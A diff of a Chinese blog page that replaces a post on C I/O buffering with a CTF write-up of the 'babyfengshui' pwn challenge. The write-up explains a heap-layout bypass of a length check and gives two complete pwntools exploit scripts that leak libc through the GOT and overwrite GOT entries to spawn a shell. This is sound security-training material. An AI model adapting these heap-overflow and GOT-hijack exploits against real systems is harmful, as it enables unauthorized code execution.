@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>IO缓冲区 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" IO缓冲区 ">
-  <meta name="description" content="IO缓冲区 | sixpar&#39;s blog">
+  <title>攻防世界pwn进阶题-babyfengshui | sixpar&#39;s blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="攻防世界pwn进阶题-babyfengshui | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -632,9 +632,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-IO缓冲区" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-攻防世界pwn进阶题-babyfengshui" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">IO缓冲区</h1>
+        <h1 class="article-title">攻防世界pwn进阶题-babyfengshui</h1>
     
     <div class="article-meta">
         
@@ -644,27 +644,20 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="学习">学习</a>
+            <a  data-rel="PWM题">PWM题</a>
             
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color1">IO缓冲区</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2020-07-18 14:43:27'>2020-07-18 14:37</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-07 15:27:26'>2020-07-07 15:06</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:1.2k</span>
+        <span>Count:1.5k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -694,7 +687,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍："><span class="toc-text">介绍：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码示例："><span class="toc-text">代码示例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#缓冲区的设置："><span class="toc-text">缓冲区的设置：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1）打开或关闭缓冲区："><span class="toc-text">(1）打开或关闭缓冲区：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#（2）更改缓冲模式："><span class="toc-text">（2）更改缓冲模式：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用步骤："><span class="toc-text">利用步骤：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#另一个EXP："><span class="toc-text">另一个EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -710,103 +703,203 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>C标准下的 I/O 缓冲区分为 全缓冲，行缓冲，无缓冲。</p>
-</blockquote>
-<h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>C/C++中，基于I/O流的操作最终会调用系统接口read()和write()完成I/O操作。为了使程序的运行效率最高，流对象通常会提供缓冲区，以减少调用系统I/O接口的调用次数。</p>
-<p>缓冲区形式有三种，分别是：</p>
-<blockquote>
-<p>（1）全缓冲。输入或输出缓冲区被填满时才会进行实际I/O操作。其他情况，如强制刷新fflush、进程结束时也会进行实际I/O操作。</p>
-</blockquote>
-<p>对于读操作来说，当读入内容的字节数等于缓冲区大小或者文件已经到达结尾，或者强制fflush刷新，会进行实际的I/O操作，将外存文件内容读入缓冲区；对于写操作来说，当缓冲区被填满或者强制刷新，会进行实际的I/O操作，缓冲区内容写到外存文件中。<br>磁盘文件操作通常是全缓冲的。</p>
-<blockquote>
-<p>（2）行缓冲。输入或输出缓冲区遇到换行符  “\n” 才会进行实际I/O操作。其他与全缓冲相同。</p>
-</blockquote>
-<p>当读到换行符”\n”时才会IO操作。</p>
-<blockquote>
-<p>（3）无缓冲。没有缓冲区，数据会立即读入内存或者输出到外存文件和设备上。</p>
-</blockquote>
-<p>标准错误输出stderr就是无缓冲的，这样能够保证错误信息及时反馈给用户。</p>
-<p>三种缓冲类型各自的 宏 定义在头文件 stdio.h 中。</p>
-<p>另外，shell为每个进程都定义了三个文件描述符：0，1，2。<br>这三个文件描述符分别与进程的标准输入，标准输出和标准出错输出相关联。</p>
-<h3 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h3><p>Linux环境下，下面一段代码可以很好地体现全缓冲和行缓冲的区别。</p>
-<pre><code class="c">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
+        <h2 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h2><pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)</code></pre><h2 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h2><p>菜单题，输入0创建一个note，一个note对应两个chunk：存放content的chunk，和struct结构体chunk。<br>name可以输入124字节，<br>然后进入sub_8048724函数，输入text_length，注意这里有一个if判断：</p>
+<pre><code class="c">if ( (char *)(v3 + *(_DWORD *)ptr[a1]) &gt;= (char *)ptr[a1] - 4 )
+    {
+      puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);
+      exit(1);
+    }</code></pre>
+<p>意思是上一块的chunk的数据开始加上输入字符串的长度（变量v3），不能超过下一个chunk的size字段。而这个检测在两个chunk相邻时是有效的，但是如果两个chunk不相邻时就会无效。<br>所以这里可以利用一下，令两个note不相邻即可，即可以是包含关系。<br>关于利用点的说明：<br><img src="https://img-blog.csdnimg.cn/20190803135529815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzOTg2MzY1,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>可以看到chunk0_struct这个chunk来到了末尾，chunk0的前后两个chunk刚好把其余部分全部包含在它的“内部”了。（真佩服作者的脑洞，这里主要是利用了堆申请的规则来构造绕过）<br>于是我们就可以往“内部”写数据，无惧检测，直接溢出到chunk1。<br>这里我们另外分配一小块chunk （chunk2）用于存储我们的binsh字符串。等待最后的delete(2)来getshell。</p>
+<h2 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h2><p>1.创建两个note（4个chunk：chunk0_content、chunk0_struct、chunk1_content、chunk1_struct）<br>2.free掉第一个note，2个chunk会合并。<br>3.创建大小为第一个note两个chunk之和，这样这个note两个chunk就会被第二个note隔开，于是可以溢出到第二个note。<br>4.gothijack，简单堆溢出，利用struct的指针改写got表中的内容</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><pre><code class="python">#coding:utf-8
+from pwn import *
+from LibcSearcher import *
+p=remote(&#39;220.249.52.133&#39;,48747)
+elf=ELF(&#39;./babyfengshui&#39;)
 
-int glob=6; 
-int main(int argc, char** argv)
-{
-    int var;  
-    pid_t pid;  
-    printf(&quot;a write to stdout\n&quot;);  
-    if(pid=fork()&lt;0)
-    {  
-        printf(&quot;fork error&quot;);  
-    }
-    else
-    {  
-        if(pid==0)
-        {  
-            glob++;  
-            var++;  
-        }  
-        else
-        {  
-            sleep(2);  
-        }  
-    }  
-    printf(&quot;pid=%d,glob=%d,var=%d\n&quot;,getpid(),glob,var);  
-    exit(0);  
-}</code></pre>
-<p>编译成功后默认生成a.out，运行结果如下：</p>
-<pre><code class="c">./a.out 
-a write to stdout
-pid=4823,glob=7,var=4195873
-pid=4824,glob=7,var=4195873
+def add_note(size,length,text):
+    p.recvuntil(&#39;Action: &#39;)
+    p.sendline(&#39;0&#39;)
+    p.recvuntil(&#39;size of description: &#39;)
+    p.sendline(str(size))
+    p.recvuntil(&#39;name: &#39;)
+    p.sendline(&#39;sixpar&#39;)
+    p.recvuntil(&#39;text length: &#39;)
+    p.sendline(str(length))
+    p.recvuntil(&#39;text: &#39;)
+    p.sendline(text)
+def delete_note(idx):
+    p.recvuntil(&#39;Action: &#39;)
+    p.sendline(&#39;1&#39;)
+    p.recvuntil(&#39;index: &#39;)
+    p.sendline(str(idx))
+def display_note(idx):
+    p.recvuntil(&#39;Action: &#39;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;index: &#39;)
+    p.sendline(str(idx))
+def update_note(idx,length,text):
+    p.recvuntil(&#39;Action: &#39;)
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&#39;index: &#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;text length: &#39;)
+    p.sendline(str(length))
+    p.sendlineafter(&#39;text: &#39;,text)
 
-./a.out &gt; temp.txt
-cat temp.txt
-a write to stdout
-pid=4864,glob=7,var=4195873
-a write to stdout
-pid=4865,glob=7,var=4195873</code></pre>
-<p>默认的标准输出为终端设备即显示器，可见printf在输出到 标准输出（显示器）上时，是行缓冲，遇到换行符时则会将缓冲区内容输出到显示器，并清空缓冲区。<br>当使用重定向命令时，标准输出被重定向到磁盘txt文件，此时标准输出变成全缓冲，遇到换行符也不输出，而是被拷贝至子进程中，在父子进程结束后，各有一份输出。</p>
-<p>在fork生成子进程后，子进程会复制父进程的数据空间，当然包括父进程打开的文件描述符所对应的缓冲区。</p>
-<h2 id="缓冲区的设置："><a href="#缓冲区的设置：" class="headerlink" title="缓冲区的设置："></a>缓冲区的设置：</h2><h3 id="1）打开或关闭缓冲区："><a href="#1）打开或关闭缓冲区：" class="headerlink" title="(1）打开或关闭缓冲区："></a>(1）打开或关闭缓冲区：</h3><p>缓冲打开或关闭，可使用函数<code>setbuf()</code>或者<code>setbuffer()</code>。<br>参数buf指向缓冲区，表示开启缓冲，通常是全缓冲。<br>将buf参数设置为NULL，表示关闭缓冲。<br>注意，setbuffer()是非C标准库函数，常见于Linux。</p>
-<p>setbuf()的缓冲区长度至少为BUFSIZ (定义在stdio.h中)，否则可能会出现缓冲区溢出。<br>setbuffer可以指定缓冲区大小。</p>
-<pre><code class="c">//@header:stdio.h
-//@brief:设置指定的缓冲区或关闭缓冲
-//@param:stream:文件指针；buffer：缓冲区地址
-//@notice:使用默认缓冲大小BUFSIZ（在stdio.h中定义）
-void setbuf ( FILE * stream, char * buffer );
+add_note(0x80,0x80,&#39;aaa&#39;)  #chunk0
+add_note(0x80,0x80,&#39;bbb&#39;)  #chunk1
+add_note(0x8,0x8,&#39;/bin//sh&#39;)  #chunk2
+delete_note(0)   #chunk0的两个chunk合并了（大小为0x100），放入了unsorted bin 里
+add_note(0x100,0x19c,&#39;a&#39;*0x198+p32(elf.got[&#39;free&#39;])) #将指向description地址的指针覆盖修改为指向free的got地址。
+#原本将打印description的，现在将打印free的地址
+#注意，由于之前已经调用过free了，所以现在got表中存着的是真实的free地址。
+display_note(1)      #leak                                                  
+p.recvuntil(&#39;description: &#39;)
+free_addr=u32(p.recv(4))
+print hex(free_addr)
 
-//@notice:同setbuf，但可指定缓冲区大小
-void setbuffer(FILE *stream, char *buf, size_t size);</code></pre>
-<p>将buffer指定为NULL，关闭标准输出缓冲。</p>
-<blockquote>
-<p>setbuf(stdout,NULL)</p>
-</blockquote>
-<p>指定新的缓冲区：</p>
-<pre><code class="c">static char newBuffer[BUFSIZ];//至少是BUFSIZ（定义在stdio.h），否则存在缓冲溢出可能
-setbuf(stdout,(char*)&amp;newBuffer);
+obj=LibcSearcher(&#39;free&#39;,free_addr)
+libc_base=free_addr-obj.dump(&#39;free&#39;)
+sys_addr=libc_base + obj.dump(&#39;system&#39;)
 
-//或者指定缓冲区大小
-static char newBuffer[512];
-setbuffer(stdout,(char*)&amp;newBuffer,512);</code></pre>
-<h3 id="（2）更改缓冲模式："><a href="#（2）更改缓冲模式：" class="headerlink" title="（2）更改缓冲模式："></a>（2）更改缓冲模式：</h3><p>更改缓冲模式，可使用函数setvbuf()。</p>
-<pre><code class="c">//@header:stdio.h
-//@brief:更改缓冲模式并设置缓冲区
-//@param:stream:文件指针；buf缓冲区地址；type：缓冲区模式；size：缓冲区大小
-//@ret:0成功，非0失败
-int setvbuf(FILE *stream, char *buf, int type, unsigned size);</code></pre>
-<p>例如，将流缓冲区设置为行缓冲，调用setvbuf()时，缓冲区地址设为NULL，缓冲区大小设为0。注意，前提是存在缓冲区。</p>
-<pre><code class="c">setvbuf(stream,NULL,_IOLBF,0);  //将缓冲改为行缓冲
+update_note(1,0x4,p32(sys_addr))  #这里实际修改的是got表    
+#利用现在description的指针是指向got表的原理，改变description指针指向的地址的值改为system函数，即把free的got表地址改为system函数的地址。调用free即调用system
+delete_note(2)
+p.interactive()</code></pre>
+<h2 id="另一个EXP："><a href="#另一个EXP：" class="headerlink" title="另一个EXP："></a>另一个EXP：</h2><p>前提是知道了libc版本，原本这题如果libc版本没有出错的话，就可以利用one_gadget来做。<br>当然了，这个exp我是使用LibcSearcher知道了libc版本之后再做的。<br>libc版本为：libc6-i386_2.23-0ubuntu10_amd64.so</p>
+<pre><code class="python">#coding:utf-8
+from pwn import *
 
-//上面的代码等价于
-setlinebuf(stream);             //for Linux</code></pre>
-<p>如果调用setvbuf指定了缓冲区size大于0，缓冲区buf为NULL，则交由setvbuf进行malloc申请缓冲区。</p>
-<pre><code class="c">//间接申请1024字节全缓冲区
-setvbuf(stream,NULL,_IOFBF,1024);</code></pre>
+io=remote(&#39;220.249.52.133&#39;,48747)
+# io=process(&#39;./babyfengshui&#39;)
+elf=ELF(&#39;./babyfengshui&#39;)
+# libc=ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+libc=ELF(&#39;./libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so&#39;)
+
+def add(size,name,len,data):
+    io.recvuntil(&#39;Action: &#39;)
+    io.sendline(&#39;0&#39;)
+    io.recvuntil(&#39;description: &#39;)
+    io.sendline(str(size))
+    io.recvuntil(&#39;name: &#39;)
+    io.sendline(name)
+    io.recvuntil(&#39;length: &#39;)
+    io.sendline(str(len))
+    io.recvuntil(&#39;text: &#39;)
+    io.sendline(data)
+
+def free(idx):
+    io.recvuntil(&#39;Action: &#39;)
+    io.sendline(&#39;1&#39;)
+    io.recvuntil(&#39;index: &#39;)
+    io.sendline(str(idx))
+
+def edit(idx,len,data):
+    io.recvuntil(&#39;Action: &#39;)
+    io.sendline(&#39;3&#39;)
+    io.recvuntil(&#39;index: &#39;)
+    io.sendline(str(idx))   
+    io.recvuntil(&#39;length: &#39;)
+    io.sendline(str(len))
+    io.recvuntil(&#39;text: &#39;)
+    io.sendline(data)
+
+def show(idx):
+    io.recvuntil(&#39;Action: &#39;)
+    io.sendline(&#39;2&#39;)
+    io.recvuntil(&#39;index: &#39;)
+    io.sendline(str(idx))       
+
+
+puts_got=elf.got[&#39;puts&#39;]
+# puts_got=0x804B024
+add(0x80,&#39;sixpar&#39;,0x10,&#39;aaaa\n&#39;)#0
+# pause()
+# addr                prev                size                 status              fd                bk                
+# 0x89f4000           0x0                 0x88                 Used                None              None
+# 0x89f4088           0x0                 0x88                 Used                None              None
+# gdb-peda$ x/40xg 0x89f4000
+# 0x89f4000:    0x0000008900000000    0x0000000061616161
+# 0x89f4010:    0x0000000000000000    0x0000000000000000
+# .....                ....                .....
+# 0x89f4070:    0x0000000000000000    0x0000000000000000
+# 0x89f4080:    0x0000000000000000    
+
+# gdb-peda$ x/20xg 0x89f4088
+# 0x89f4088:    0x0000008900000000    0x70786973089f4008
+# 0x89f4098:    0x0000000000007261    0x0000000000000000
+# .......              .....              ....
+# 0x89f40f8:    0x0000000000000000    0x0000000000000000
+# 0x89f4108:    0x0000000000000000    0x00020ef100000000
+
+
+add(0x10,&#39;sixpar&#39;,0x10,&#39;bbbb\n&#39;)#1
+# pause()
+# addr                prev                size                 status              fd                bk                
+# 0x89f4000           0x0                 0x88                 Used                None              None
+# 0x89f4088           0x0                 0x88                 Used                None              None
+# 0x89f4110           0x0                 0x18                 Used                None              None
+# 0x89f4128           0x0                 0x88                 Used                None              None
+
+# gdb-peda$ x/40xg 0x89f4110
+# 0x89f4110:    0x0000001900000000    0x0000000062626262
+# 0x89f4120:    0x0000000000000000
+
+# gdb-peda$ x/20xg 0x89f4128
+# 0x89f4128:    0x0000008900000000    0x70786973089f4118
+# 0x89f4138:    0x0000000000007261    0x0000000000000000
+# .....               .....              ......
+# 0x89f4198:    0x0000000000000000    0x0000000000000000
+# 0x89f41a8:    0x0000000000000000    0x00020e5100000000
+
+free(0) #unsortbin: 0x8cd4000 (size : 0x110)
+# pause()
+# addr                prev                size                 status              fd                bk                
+# 0x89f4000           0x0                 0x110                Freed         0xf7f437b0        0xf7f437b0
+# 0x89f4110           0x110               0x18                 Used                None              None
+# 0x89f4128           0x0                 0x88                 Used                None              None
+
+# 0x89f4000:    0x0000011100000000    0xf7f437b0f7f437b0 #chunk0_content
+# 0x89f4010:    0x0000000000000000    0x0000000000000000
+# .....               ......              .....
+# 0x89f4088:    0x0000008800000088  0x70786973089f4008 #chunk0_struct
+# 0x89f4098:    0x0000000000007261  0x0000000000000000
+# .....
+# 0x89f4110:    0x0000001800000110    0x0000000062626262  #chunk1
+# 0x89f4120:    0x0000000000000000    0x0000008900000000
+# 0x89f4130:    0x70786973089f4118    0x0000000000007261
+
+add(0x108,&#39;sixpar&#39;,0x150,&#39;a&#39;*0x124+p32(0x81)+p32(puts_got))
+# pause()
+# addr                prev                size                 status              fd                bk                
+# 0x89f4000           0x0                 0x110                Used                None              None
+# Corrupt ?!
+# 0x89f4000:    0x0000011100000000    0x6161616161616161
+# 0x89f4010:    0x6161616161616161    0x6161616161616161
+# .....                 ....               .....
+# 0x89f4128:    0x0000008161616161    0x7078000a0804b024
+# 0x89f4138:    0x0000000000007261    0x0000000000000000
+#可以看到，内容全部填充为a，然后溢出，修改chunk2的size为0x81，
+# 然后将指向content的指针覆盖修改为 puts的got地址
+show(1) #leak
+io.recvuntil(&#39;description: &#39;)
+puts_addr=u32(io.recv(4))
+print &quot;puts_got is :&quot;+hex(puts_addr)
+libc_base=puts_addr-libc.symbols[&#39;puts&#39;] 
+one_gadget=libc_base + 0x3a80c
+
+edit(1,10,p32(one_gadget))  #修改puts的got表地址为one_gadget
+
+io.interactive()</code></pre>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>本题给的libc版本是错的，所以我弄了半天，后来还是采用LibcSearcher好了。<br>只要把pwn程序和exp一起放到LibcSearcher的安装目录里，然后运行exp即可。<br>LibcSearcher会自动根据我们泄露出来的free的地址来寻找适合的libc版本。</p>
+<p>还有，也可以使用在线libc库来查找合适的libc版本，我用随便一次泄露出来的free地址试了一下，果然还是准的。<br>如图：<br><img src="https://i.loli.net/2020/07/18/C4Wa12GrixVMPdq.jpg" alt=""></p>
+<p>在线libc版本库查询地址： <a href="https://libc.blukat.me" target="_blank" rel="noopener">https://libc.blukat.me</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
